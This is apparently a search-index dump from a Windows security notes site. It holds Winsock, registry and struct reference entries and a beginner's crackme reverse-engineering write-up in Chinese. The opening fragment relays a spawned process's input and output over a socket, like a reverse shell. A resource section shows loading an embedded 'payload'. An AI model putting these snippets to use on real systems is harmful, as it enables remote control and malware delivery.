CloseHandle(hInputRead); CloseHandle(hOutputWrite); CloseHandle(processInfo.hThread); ThreadParams outputParams = { hOutputRead, NULL, sock }; ThreadParams inputParams = { NULL, hInputWrite, sock }; HANDLE hThread[2]; hThread[0] = CreateThread(NULL, 0, OutputThreadFunc, &outputParams, 0, NULL); hThread[1] = CreateThread(NULL, 0, InputThreadFunc, &inputParams, 0, NULL); WaitForMultipleObjects(2, hThread, TRUE, INFINITE); CleanUp(hInputWrite, NULL, NULL, hOutputRead, processInfo, result, sock); return 0; } void CleanUp(HANDLE hInputWrite, HANDLE hInputRead, HANDLE hOutputWrite, HANDLE hOutputRead, PROCESS_INFORMATION processInfo, addrinfo* result, SOCKET sock) { if (hInputWrite != NULL) CloseHandle(hInputWrite); if (hInputRead != NULL) CloseHandle(hInputRead); if (hOutputWrite != NULL) CloseHandle(hOutputWrite); if (hOutputRead != NULL) CloseHandle(hOutputRead); if (processInfo.hProcess != NULL) CloseHandle(processInfo.hProcess); if (processInfo.hThread != NULL) CloseHandle(processInfo.hThread); if (result != NULL) freeaddrinfo(result); if (sock != NULL) closesocket(sock); WSACleanup(); } DWORD WINAPI OutputThreadFunc(LPVOID data) { ThreadParams* params = (ThreadParams*)data; char buffer[4096]; DWORD bytesRead; while (ReadFile(params->hPipeRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL)) { buffer[bytesRead] = '\\0'; send(params->sock, buffer, bytesRead, 0); } return 0; } DWORD WINAPI InputThreadFunc(LPVOID data) { ThreadParams* params = (ThreadParams*)data; char buffer[4096]; int bytesRead; while ((bytesRead = recv(params->sock, buffer, sizeof(buffer) - 1, 0)) > 0) { DWORD bytesWritten; WriteFile(params->hPipeWrite, buffer, bytesRead, &bytesWritten, NULL); } return 0; } WSAStartup int WSAStartup( WORD wVersionRequired, LPWSADATA lpWSAData ); // Initializes the Winsock library for an application. Must be called before any other Winsock functions. WSAConnect int WSAConnect( SOCKET s, // Descriptor identifying a socket. const struct sockaddr* name, // Pointer to the sockaddr structure for the connection target. int namelen, // Length of the sockaddr structure. LPWSABUF lpCallerData, // Pointer to user data to be transferred during connection. LPWSABUF lpCalleeData, // Pointer to user data transferred back during connection. LPQOS lpSQOS, // Pointer to flow specs for socket s, one for each direction. LPQOS lpGQOS // Pointer to flow specs for the socket group. ); // Establishes a connection to another socket application.This function is similar to connect, but allows for more control over the connection process. WSASend int WSASend( SOCKET s, // Descriptor identifying a connected socket. LPWSABUF lpBuffers, // Array of buffers for data to be sent. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call. DWORD dwFlags, // Flags to modify the behavior of the function call. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed. ); // Sends data on a connected socket.It can be used for both synchronous and asynchronous data transfer. WSARecv int WSARecv( SOCKET s, // Descriptor identifying a connected socket. LPWSABUF lpBuffers, // Array of buffers to receive the incoming data. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call. LPDWORD lpFlags, // Flags to modify the behavior of the function call. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed. ); //Receives data from a connected socket, and can also be used for both synchronous and asynchronous data transfer. WSASendTo int WSASendTo( SOCKET s, // Descriptor identifying a socket. LPWSABUF lpBuffers, // Array of buffers containing the data to be sent. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call. DWORD dwFlags, // Flags to modify the behavior of the function call. const struct sockaddr* lpTo, // Pointer to the sockaddr structure for the target address. int iToLen, // Size of the address in lpTo. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed. ); // Sends data to a specific destination, for use with connection - less socket types such as SOCK_DGRAM. WSARecvFrom int WSARecvFrom( SOCKET s, // Descriptor identifying a socket. LPWSABUF lpBuffers, // Array of buffers to receive the incoming data. DWORD dwBufferCount, // Number of buffers in the lpBuffers array. LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call. LPDWORD lpFlags, // Flags to modify the behavior of the function call. struct sockaddr* lpFrom, // Pointer to an address structure that will receive the source address upon completion of the operation. LPINT lpFromlen, // Pointer to the size of the lpFrom address structure. LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations. LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed. ); //Receives data from a specific source, used with connection - less socket types such as SOCK_DGRAM. WSAAsyncSelect int WSAAsyncSelect( SOCKET s, // Descriptor identifying the socket. HWND hWnd, // Handle to the window which should receive the message. unsigned int wMsg, // Message to be received when an event occurs. long lEvent // Bitmask specifying a group of conditions to be monitored. ); // Requests Windows message - based notification of network events for a socket. socket SOCKET socket( int af, int type, int protocol ); // Creates a new socket for network communication. bind int bind( SOCKET s, const struct sockaddr *name, int namelen ); // Binds a socket to a specific local address and port. listen int listen( SOCKET s, int backlog ); // Sets a socket to listen for incoming connections. accept SOCKET accept( SOCKET s, struct sockaddr *addr, int *addrlen ); // Accepts a new incoming connection on a listening socket. connect int connect( SOCKET s, const struct sockaddr *name, int namelen ); // Initiates a connection on a socket to a remote address. send int send( SOCKET s, const char *buf, int len, int flags ); // Sends data on a connected socket. recv int recv( SOCKET s, char *buf, int len, int flags ); // Receives data from a connected socket. closesocket int closesocket( SOCKET s ); //Closes a socket and frees its resources. gethostbyname hostent* gethostbyname( const char* name // either a hostname or an IPv4 address in dotted-decimal notation ); // returns a pointer to a hostent struct. NOTE: Typically better to use getaddrinfo","title":"Winsock"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#registry-operations","text":"RegOpenKeyExW LONG RegOpenKeyExW( HKEY hKey, LPCWTSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult ); // Opens the specified registry key. RegQueryValueExW LONG RegQueryValueExW( HKEY hKey, LPCWTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData ); // Retrieves the type and data of the specified value name associated with an open registry key. RegSetValueExW LONG RegSetValueEx( HKEY hKey, LPCWTSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData ); // Sets the data and type of the specified value name associated with an open registry key. RegCloseKey LONG RegCloseKey( HKEY hKey ); // Closes a handle to the specified registry key. RegCreateKeyExA LSTATUS RegCreateKeyExA( [in] HKEY hKey, [in] LPCSTR lpSubKey, DWORD Reserved, [in, optional] LPSTR lpClass, [in] DWORD dwOptions, [in] REGSAM samDesired, [in, optional] const LPSECURITY_ATTRIBUTES lpSecurityAttributes, [out] PHKEY phkResult, [out, optional] LPDWORD lpdwDisposition ); // Creates the specified registry key. If the key already exists, the function opens it. Note that key names are not case sensitive. RegSetValueExA LSTATUS RegSetValueExA( [in] HKEY hKey, [in, optional] LPCSTR lpValueName, DWORD Reserved, [in] DWORD dwType, [in] const BYTE *lpData, [in] DWORD cbData ); // Sets the data and type of a specified value under a registry key. RegCreateKeyA LSTATUS RegCreateKeyA( [in] HKEY hKey, [in, optional] LPCSTR lpSubKey, [out] PHKEY phkResult ); // Creates the specified registry key. If the key already exists in the registry, the function opens it. RegDeleteKeyA LSTATUS RegDeleteKeyA( [in] HKEY hKey, [in] LPCSTR lpSubKey ); // Deletes a subkey and its values. Note that key names are not case sensitive. NtRenameKey __kernel_entry NTSTATUS NtRenameKey( [in] HANDLE KeyHandle, [in] PUNICODE_STRING NewName ); // Changes the name of the specified registry key.","title":"Registry Operations"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#error-handling","text":"WSAGetLastError int WSAGetLastError( void ); // Returns the error status for the last Windows Sockets operation that failed. WSASetLastError void WSASetLastError( int iError ); // Sets the error status for the last Windows Sockets operation. WSAGetOverlappedResult BOOL WSAGetOverlappedResult( SOCKET s, LPWSAOVERLAPPED lpOverlapped, LPDWORD lpcbTransfer, BOOL fWait, LPDWORD lpdwFlags ); // Determines the results of an overlapped operation on the specified socket. WSAIoctl int WSAIoctl( SOCKET s, DWORD dwIoControlCode, LPVOID lpvInBuffer, DWORD cbInBuffer, LPVOID lpvOutBuffer, DWORD cbOutBuffer, LPDWORD lpcbBytesReturned, LPWSAOVERLAPPED lpOverlapped, LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine ); // Controls the mode of a socket. WSACreateEvent WSAEVENT WSACreateEvent( void ); // Creates a new event object. WSASetEvent BOOL WSASetEvent( WSAEVENT hEvent ); // Sets the state of the specified event object to signaled. WSAResetEvent BOOL WSAResetEvent( WSAEVENT hEvent ); // Sets the state of the specified event object to nonsignaled. WSACloseEvent BOOL WSACloseEvent( WSAEVENT hEvent ); // Closes an open event object handle. WSAWaitForMultipleEvents DWORD WSAWaitForMultipleEvents( DWORD cEvents, const WSAEVENT *lphEvents, BOOL fWaitAll, DWORD dwTimeout, BOOL fAlertable ); // Waits for multiple event objects and returns when the specified events are signaled or the time-out interval elapses.","title":"Error Handling"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#resource-management","text":"FindResource HRSRC FindResource( [in, optional] HMODULE hModule, // A handle to the module whose portable executable file or an accompanying MUI file contains the resource. If this parameter is NULL, the function searches the module used to create the current process. [in] LPCSTR lpName, // The name of the resource. [in] LPCSTR lpType // The resource type. ); // Determines the location of a resource with the specified type and name in the specified module. HRSRC res = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA); LoadResource HGLOBAL LoadResource( [in, optional] HMODULE hModule, // A handle to the module whose executable file contains the resource. [in] HRSRC hResInfo // A handle to the resource to be loaded. ); // Retrieves a handle that can be used to obtain a pointer to the first byte of the specified resource in memory. HGLOBAL resHandle = resHandle = LoadResource(NULL, res); LockResource LPVOID LockResource( [in] HGLOBAL hResData // A handle to the resource to be accessed ); // Retrieves a pointer to the specified resource in memory. unsigned char * payload = (char *) LockResource(resHandle); SizeofResource DWORD SizeofResource( [in, optional] HMODULE hModule, // A handle to the module whose executable file contains the resource [in] HRSRC hResInfo // A handle to the resource. This handle must be created by using FindResource ); // Retrieves the size, in bytes, of the specified resource. unsigned int payload_len = SizeofResource(NULL, res);","title":"Resource Management"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#unicode-string-functions","text":"#include <wchar.h> // for wide character string routines","title":"Unicode String Functions"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#string-length","text":"size_t wcslen( const wchar_t *str ); // Returns the length of the given wide string.","title":"String Length"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#string-copy","text":"[wcscpy] wchar_t *wcscpy( wchar_t *dest, const wchar_t *src ); // Copies the wide string from src to dest. [wcsncpy] wchar_t *wcsncpy( wchar_t *dest, const wchar_t *src, size_t count ); // Copies at most count characters from the wide string src to dest.","title":"String Copy"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#string-concatenation","text":"[wcscat] wchar_t *wcscat( wchar_t *dest, const wchar_t *src ); // Appends the wide string src to the end of the wide string dest. [wcsncat] wchar_t *wcsncat( wchar_t *dest, const wchar_t *src, size_t count ); // Appends at most count characters from the wide string src to the end of the wide string dest.","title":"String Concatenation"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#string-comparison","text":"[wcscmp] int wcscmp( const wchar_t *str1, const wchar_t *str2 ); // Compares two wide strings lexicographically. [wcsncmp] int wcsncmp( const wchar_t *str1, const wchar_t *str2, size_t count ); // Compares up to count characters of two wide strings lexicographically. [_wcsicmp] int _wcsicmp( const wchar_t *str1, const wchar_t *str2 ); // Compares two wide strings lexicographically, ignoring case. [_wcsnicmp] int _wcsnicmp( const wchar_t *str1, const wchar_t *str2, size_t count ); // Compares up to count characters of two wide strings lexicographically, ignoring case.","title":"String Comparison"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#string-search","text":"[wcschr] wchar_t *wcschr( const wchar_t *str, wchar_t c ); // Finds the first occurrence of the wide character c in the wide string str. [wcsrchr] wchar_t *wcsrchr( const wchar_t *str, wchar_t c ); // Finds the last occurrence of the wide character c in the wide string str. [wcspbrk] wchar_t *wcspbrk( const wchar_t *str1, const wchar_t *str2 ); // Finds the first occurrence in the wide string str1 of any character from the wide string str2. [wcsstr] wchar_t *wcsstr( const wchar_t *str1, const wchar_t *str2 ); // Finds the first occurrence of the wide string str2 in the wide string str1. [wcstok] wchar_t *wcstok( wchar_t *str, const wchar_t *delimiters ); // Splits the wide string str into tokens based on the delimiters.","title":"String Search"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#character-classification-and-conversion","text":"[towupper] wint_t towupper( wint_t c ); // Converts a wide character to uppercase. [towlower] wint_t towlower( wint_t c ); // Converts a wide character to lowercase. [iswalpha] int iswalpha( wint_t c ); // Checks if the wide character is an alphabetic character. [iswdigit] int iswdigit( wint_t c ); // Checks if the wide character is a decimal digit. [iswalnum] int iswalnum( wint_t c ); // Checks if the wide character is an alphanumeric character. [iswspace] int iswspace( wint_t c ); // Checks if the wide character is a whitespace character. [iswxdigit] int iswxdigit( wint_t c ); // Checks if the wide character is a valid hexadecimal digit.","title":"Character Classification and Conversion"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#win32-structs-cheat-sheet","text":"","title":"Win32 Structs Cheat Sheet"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#common-structs","text":"SYSTEM_INFO #include <sysinfoapi.h> // Contains information about the current computer system, including the architecture and type of the processor, the number of processors, and the page size. typedef struct _SYSTEM_INFO { union { DWORD dwOemId; struct { WORD wProcessorArchitecture; WORD wReserved; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; DWORD dwPageSize; LPVOID lpMinimumApplicationAddress; LPVOID lpMaximumApplicationAddress; DWORD_PTR dwActiveProcessorMask; DWORD dwNumberOfProcessors; DWORD dwProcessorType; DWORD dwAllocationGranularity; WORD wProcessorLevel; WORD wProcessorRevision; } SYSTEM_INFO; FILETIME #include <minwinbase.h> // Represents the number of 100-nanosecond intervals since January 1, 1601 (UTC). Used for file and system time. typedef struct _FILETIME { DWORD dwLowDateTime; DWORD dwHighDateTime; } FILETIME; STARTUPINFO #include <processthreadsapi.h> // Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time. typedef struct _STARTUPINFOA { DWORD cb; LPSTR lpReserved; LPSTR lpDesktop; LPSTR lpTitle; DWORD dwX; DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; DWORD dwYCountChars; DWORD dwFillAttribute; DWORD dwFlags; WORD wShowWindow; WORD cbReserved2; LPBYTE lpReserved2; HANDLE hStdInput; HANDLE hStdOutput; HANDLE hStdError; } STARTUPINFOA, *LPSTARTUPINFOA; PROCESS_INFORMATION #include <processthreadsapi.h> // Contains information about a newly created process and its primary thread. typedef struct _PROCESS_INFORMATION { HANDLE hProcess; HANDLE hThread; DWORD dwProcessId; DWORD dwThreadId; } PROCESS_INFORMATION, *LPPROCESS_INFORMATION; PROCESSENTRY32 #include <tlhelp32.h> typedef struct tagPROCESSENTRY32 { DWORD dwSize; DWORD cntUsage; DWORD th32ProcessID; ULONG_PTR th32DefaultHeapID; DWORD th32ModuleID; DWORD cntThreads; DWORD th32ParentProcessID; LONG pcPriClassBase; DWORD dwFlags; CHAR szExeFile[MAX_PATH]; } PROCESSENTRY32; SECURITY_ATTRIBUTES // Determines whether the handle can be inherited by child processes and specifies a security descriptor for a new object. typedef struct _SECURITY_ATTRIBUTES { DWORD nLength; LPVOID lpSecurityDescriptor; BOOL bInheritHandle; } SECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; OVERLAPPED #inluce <minwinbase.h> // Contains information used in asynchronous (also known as overlapped) input and output (I/O) operations. typedef struct _OVERLAPPED { ULONG_PTR Internal; ULONG_PTR InternalHigh; union { struct { DWORD Offset; DWORD OffsetHigh; } DUMMYSTRUCTNAME; PVOID Pointer; } DUMMYUNIONNAME; HANDLE hEvent; } OVERLAPPED, *LPOVERLAPPED; GUID #include <guiddef.h> // Represents a globally unique identifier (GUID), used to identify objects, interfaces, and other items. typedef struct _GUID { unsigned long Data1; unsigned short Data2; unsigned short Data3; unsigned char Data4[8]; } GUID; MEMORY_BASIC_INFORMATION #include <winnt.h> // Contains information about a range of pages in the virtual address space of a process. typedef struct _MEMORY_BASIC_INFORMATION { PVOID BaseAddress; PVOID AllocationBase; DWORD AllocationProtect; SIZE_T RegionSize; DWORD State; DWORD Protect; DWORD Type; } MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION; SYSTEMTIME #include <minwinbase.h> // Specifies a date and time, using individual members for the month, day, year, weekday, hour, minute, second, and millisecond. typedef struct _SYSTEMTIME { WORD wYear; WORD wMonth; WORD wDayOfWeek; WORD wDay; WORD wHour; WORD wMinute; WORD wSecond; WORD wMilliseconds; } SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME; COORD // Defines the coordinates of a character cell in a console screen buffer, where the origin (0,0) is at the top-left corner. typedef struct _COORD { SHORT X; SHORT Y; } COORD, *PCOORD; SMALL_RECT // Defines the coordinates of the upper left and lower right corners of a rectangle. typedef struct _SMALL_RECT { SHORT Left; SHORT Top; SHORT Right; SHORT Bottom; } SMALL_RECT; CONSOLE_SCREEN_BUFFER_INFO // Contains information about a console screen buffer. typedef struct _CONSOLE_SCREEN_BUFFER_INFO { COORD dwSize; COORD dwCursorPosition; WORD wAttributes; SMALL_RECT srWindow; COORD dwMaximumWindowSize; } CONSOLE_SCREEN_BUFFER_INFO, *PCONSOLE_SCREEN_BUFFER_INFO; WSADATA #include <winsock.h> // Contains information about the Windows Sockets implementation. typedef struct WSAData { WORD wVersion; WORD wHighVersion; unsigned short iMaxSockets; unsigned short iMaxUdpDg; char FAR *lpVendorInfo; char szDescription[WSADESCRIPTION_LEN+1]; char szSystemStatus[WSASYS_STATUS_LEN+1]; } WSADATA, *LPWSADATA; CRITICAL_SECTION // Represents a critical section object, which is used to provide synchronization access to a shared resource. typedef struct _RTL_CRITICAL_SECTION { PRTL_CRITICAL_SECTION_DEBUG DebugInfo; LONG LockCount; LONG RecursionCount; HANDLE OwningThread; HANDLE LockSemaphore; ULONG_PTR SpinCount; } RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION; WSAPROTOCOL_INFO #include <winsock2.h> // Contains Windows Sockets protocol information. typedef struct _WSAPROTOCOL_INFOA { DWORD dwServiceFlags1; DWORD dwServiceFlags2; DWORD dwServiceFlags3; DWORD dwServiceFlags4; DWORD dwProviderFlags; GUID ProviderId; DWORD dwCatalogEntryId; WSAPROTOCOLCHAIN ProtocolChain; int iVersion; int iAddressFamily; int iMaxSockAddr; int iMinSockAddr; int iSocketType; int iProtocol; int iProtocolMaxOffset; int iNetworkByteOrder; int iSecurityScheme; DWORD dwMessageSize; DWORD dwProviderReserved; CHAR szProtocol[WSAPROTOCOL_LEN+1]; } WSAPROTOCOL_INFOA, *LPWSAPROTOCOL_INFOA; MSGHDR #include <ws2def.h> // Contains message information for use with the `sendmsg` and `recvmsg` functions. typedef struct _WSAMSG { LPSOCKADDR name; INT namelen; LPWSABUF lpBuffers; ULONG dwBufferCount; WSABUF Control; ULONG dwFlags; } WSAMSG, *PWSAMSG, *LPWSAMSG;","title":"Common Structs"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#win32-sockets-structs-cheat-sheet-winsockh","text":"SOCKADDR // A generic socket address structure used for compatibility with various address families. typedef struct sockaddr { u_short sa_family; char sa_data[14]; } SOCKADDR, *PSOCKADDR, *LPSOCKADDR; SOCKADDR_IN // Represents an IPv4 socket address, containing the IPv4 address, port number, and address family. typedef struct sockaddr_in { short sin_family; u_short sin_port; struct in_addr sin_addr; char sin_zero[8]; } SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN; LINGER // Used to set the socket option SO_LINGER, which determines the action taken when unsent data is queued on a socket and a `closesocket` is performed. typedef struct linger { u_short l_onoff; u_short l_linger; } LINGER, *PLINGER, *LPLINGER; TIMEVAL // Represents a time interval, used with the `select` function to specify a timeout period. typedef struct timeval { long tv_sec; long tv_usec; } TIMEVAL, *PTIMEVAL, *LPTIMEVAL; FD_SET // Represents a set of sockets used with the `select` function to check for socket events. typedef struct fd_set { u_int fd_count; SOCKET fd_array[FD_SETSIZE]; } fd_set, *Pfd_set, *LPfd_set;","title":"Win32 Sockets Structs Cheat Sheet (winsock.h)"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#win32-sockets-structs-cheat-sheet-winsock2h","text":"IN_ADDR // Represents an IPv4 address. typedef struct in_addr { union { struct { u_char s_b1, s_b2, s_b3, s_b4; } S_un_b; struct { u_short s_w1, s_w2; } S_un_w; u_long S_addr; } S_un; } IN_ADDR, *PIN_ADDR, *LPIN_ADDR;","title":"Win32 Sockets Structs Cheat Sheet (winsock2.h)"},{"location":"Windows%E7%9B%B8%E5%85%B3/Windows%20API%E7%A4%BA%E4%BE%8B%E5%A4%A7%E5%85%A8/#win32-sockets-structs-cheat-sheet-ws2defh","text":"ADDRINFO #include <ws2def.h> // Contains information about an address for use with the `getaddrinfo` function, and is used to build a linked list of addresses. typedef struct addrinfoW { int ai_flags; int ai_family; int ai_socktype; int ai_protocol; size_t ai_addrlen; PWSTR *ai_canonname; struct sockaddr *ai_addr; struct addrinfo *ai_next; } ADDRINFOW, *PADDRINFOW; WSABUF #include <ws2def.h> // Contains a pointer to a buffer and its length. Used for scatter/gather I/O operations. typedef struct _WSABUF { ULONG len; __field_bcount(len) CHAR FAR *buf; } WSABUF, FAR * LPWSABUF; SOCKADDR_IN6 #include <ws2ipdef.h> // Represents an IPv6 socket address, containing the IPv6 address, port number, flow info, and address family. typedef struct sockaddr_in6 { short sin6_family; u_short sin6_port; u_long sin6_flowinfo; struct in6_addr sin6_addr; u_long sin6_scope_id; } SOCKADDR_IN6, *PSOCKADDR_IN6, *LPSOCKADDR_IN6; IN6_ADDR #include <in6addr.h> // Represents an IPv6 address. typedef struct in6_addr { union { u_char Byte[16]; u_short Word[8]; } u; } IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;","title":"Win32 Sockets Structs Cheat Sheet (ws2def.h)"},{"location":"Windows%E7%9B%B8%E5%85%B3/crackmes.one%E7%BB%83%E4%B9%A0/","text":"\u4f5c\u4e3a\u4e00\u4e2a\u9006\u5411\u83dc\u9e1f\u7684\u7ec3\u4e60 zun1 crackme \u7a0b\u5e8f\u529f\u80fd \u6253\u5f00\u540e\u63d0\u793a\u8f93\u5165\u8d26\u53f7\u5bc6\u7801 \u52a8\u6001 \u5b9a\u4f4d\u5230\u62a5\u9519\u5b57\u7b26\u4e32\uff0c\u5b57\u7b26\u4e32\u524d\u6709\u4e00\u4e2a\u51fd\u6570\u5224\u65ad\uff0c\u4e0b\u4e2a\u65ad\u70b9\u770b\u770b jne\u4e86\u4e00\u4e2a\u51fd\u6570\uff0cjne\u662f\u5224\u65adZF\u662f\u5426\u7b49\u4e8e1\uff0c\u4e3a0\u65f6\u8df3\u8f6c \u7528\u6237\u540d\u968f\u4fbf\u8f93\u4e86123123\uff0czf\u4e3a0\u4e86\u3002\u8fd9\u65f6rsp\u4e3a123123\uff0c123123\u88ab\u538b\u5165\u4e86\u6808\u9876\uff0c\u4f46\u662frcx\u662f\u4ec0\u4e48\uff0c\u4e3a\u4ec0\u4e48\u662f234234\uff1f \u5176\u5b9e\u6b64\u65f6\u53ef\u4ee5\u731c\u5230234234\u662f\u5bc6\u7801\uff0c\u8bd5\u4e86\u4e00\u4e0b\u786e\u5b9e\u662f\u5bc6\u7801\u3002\u5bc6\u7801\u5c31\u662f\u6839\u636e\u7528\u6237\u540d\u6309\u5b57\u7b26\u52a01\u3002 \u4ed4\u7ec6\u770b\u770b\u8fd9\u4e2a\u7a0b\u5e8f\u6d41\u7a0b call crackme.4010F8 cmp eax,0x0 jne crackme.401249 crackme.401249 \u662f\u5224\u65ad\uff0c\u90a3\u4e48crackme.4010F8\u51fd\u6570\u53ef\u80fd\u5c31\u662f\u5bc6\u7801\u751f\u6210\u7684\u903b\u8f91\u3002 crackme.4010F8\u8be6\u60c5\u5982\u4e0b push rbp mov rbp,rsp sub rsp,0x20 //\u51fd\u6570\u5e8f\u8a00 mov qword ptr ss:[rbp+0x10],rcx mov qword ptr ss:[rbp+0x18],rdx //fastcall\u4e2drcx\u548crdx\u662f\u4f20\u5165\u51fd\u6570\u7684\u4e24\u4e2a\u53c2\u6570\uff0c\u4e00\u4e2a\u662f\u7528\u6237\u540d\u4e00\u4e2a\u662f\u5bc6\u7801\uff0c\u5168\u538b\u6808\u4e86 mov rax,qword ptr ss:[rbp+0x10] mov r10,rax mov rcx,r10 //\u7528\u6237\u540d\u4e00\u5c42\u5c42\u6700\u540e\u7ed9\u4e86rcx call crackme.401048 //\u53c8\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\uff0c\u8fd9\u5e94\u8be5\u662f\u8ba1\u7b97\u5bc6\u7801\u7684\u51fd\u6570 mov rcx,qword ptr ss:[rbp+0x18] //\u7b97\u5b8c\u540e\u628a\u5bc6\u7801\u8d4b\u7ed9\u4e86rcx mov r11,rcx mov r10,rax mov rcx,r10 mov rdx,r11 //\u7528\u6237\u540d\u7ed9\u4e86rcx\uff0c\u5bc6\u7801\u7ed9\u4e86rdx call <JMP.&strcmp> //strcmp\u5b57\u7b26\u4e32\u6bd4\u8f83\u51fd\u6570 cmp eax,0x0 jne crackme.401142 mov eax,0x0 jmp crackme.401147 mov eax,0x1 leave ret \u8be6\u7ec6\u770b\u770bcrackme.401048\u4e2d\u5bc6\u7801\u600e\u4e48\u7b97\u7684 push rbp mov rbp,rsp sub rsp,0x30 //\u51fd\u6570\u5e8f\u8a00 mov qword ptr ss:[rbp+0x10],rcx mov rax,qword ptr ss:[rbp+0x10] mov r8,rax //\u7528\u6237\u540d\u7ed9\u4e86[rbp+0x10]\u3001rax\u3001r8 mov eax,0x20 //eax\u4e3a0x20 mov r11,rax //r11\u4e3a\u7528\u6237\u540d lea rax,qword ptr ds:[0x402220] //\u7ed9\u4e86rax\u4e00\u4e2a\u5730\u57400x402220 mov r10,rax mov rcx,r10 mov rdx,r11 //rcx\u662f\u5730\u57400x402220\uff0crdx\u662f\u7528\u6237\u540d call <JMP.&strcpy_s> //\u8c03\u7528strcpy_s\u51fd\u6570\u590d\u5236\u5b57\u7b26\u4e32\u3002\u7528\u6237\u540d\u590d\u5236\u5230\u4e86[0x402220] cmp eax,0x0 // \u7f6e0 je crackme.401096 // \u8df3\u8f6c\u4e86 lea rax,qword ptr ds:[0x402004] mov r10,rax mov rcx,r10 call crackme.401000 //strcpy_s\u9519\u8bef\u65f6\u7684\u5224\u65ad mov eax,0x0 //crackme.401096\u8df3\u5230\u8fd9\u91cc\u4e86 mov dword ptr ss:[rbp-0x4],eax //eax\u5206\u914d\u7ed9\u4e86rbp-0x4 lea rax,qword ptr ds:[0x402220] //\u7ed9\u4e86rax\u4e00\u4e2a\u5730\u57400x402220\uff0c\u4e5f\u5c31\u662f\u7528\u6237\u540d\u7684\u5730\u5740 mov r10,rax mov rcx,r10 //\u6700\u540e\u7ed9\u4e86rcx call <JMP.&strlen> //strlen\u8ba1\u7b97rcx\u957f\u5ea6\uff0c\u8ba1\u7b97\u7528\u6237\u540d\u957f\u5ea6,\u8fd4\u56de\u503c\u4ecerax\u4f20\u51fa mov ecx,dword ptr ss:[rbp-0x4] movsxd rcx,ecx //ecx\u6269\u5c55\u5230rcx\uff0crcx\u4e3a0\u4e86 cmp rcx,rax //\u6bd4\u8f83\u7528\u6237\u540d\u957f\u5ea6\u662f\u4e0d\u662f0\uff0c\u5bf9\u6807\u5fd7\u4f4d\u4ea7\u751f\u5f71\u54cd \u7b2c\u4e00\u6b21\u5faa\u73af\uff0crcx\u53d8\u4e3a223 \u7b2c\u4e8c\u6b21\u5faa\u73af \u7b2c\u4e09\u6b21\u5faa\u73af........ \u5faa\u73af\u4f53\u4e2d\u7528\u5730\u57400x402220\u5b58\u50a8\u8ba1\u7b97\u7684\u503c\uff0c\u7528\u4ee5\u4e0b\u6307\u4ee4 lea rcx,qword ptr ds:[0x402220] add rcx,rax movsx eax,byte ptr 